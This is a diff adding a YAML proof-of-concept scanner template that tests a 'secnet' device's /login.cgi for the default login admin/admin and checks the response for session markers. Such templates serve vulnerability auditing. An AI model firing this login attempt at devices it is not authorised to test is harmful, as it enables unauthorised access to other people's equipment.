@@ -1,0 +1,19 @@
+name: poc-yaml-secnet-weakpassword
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /login.cgi
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: user=admin&password=admin
+    expression: response.status == 200 && response.raw_header.bcontains(b'Set-Cookie:') && response.raw_header.bcontains(b'ac_userid=admin') && response.body.bcontains(b'window.open(') && response.body.bcontains(b'index.htm?_')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/138921422
